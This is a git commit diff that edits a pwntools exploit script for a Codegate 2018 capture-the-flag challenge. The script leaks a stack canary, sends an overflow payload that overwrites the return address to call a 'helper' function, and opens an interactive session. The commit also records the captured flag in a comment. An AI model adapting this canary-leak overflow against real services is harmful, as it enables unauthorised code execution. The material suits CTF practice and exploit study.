ea0dc7272e7c30e754482a9f6e2f9798092ea362
jaemin8852 <jaemin8852@naver.com>
2018-04-06 16:53:57 +0900

    Update betting_ex.py

--- codegate-2018/betting_ex.py
+++ codegate-2018/betting_ex.py
@@ -11,9 +11,11 @@ s.sendlineafter('with? ', '100')
 
 s.recvuntil('Hi, '+'A'*24+'\x0a')
 canary = u64('\x00'+s.recv(7))
-print hex(canary)
-pause()
-payload = "A"*40+p64(canary)+"A"*8+p64(helper)
+log.info("canary : " + hex(canary))
+
+payload = "A"*40 + p64(canary) + "A"*8 + p64(helper)
 s.sendline('100\x0a'+payload)
-pause()
+
 s.interactive()
+
+#flag{L1fe consists n0t 1n h0lding good cards but in playing those you h0ld well:)}
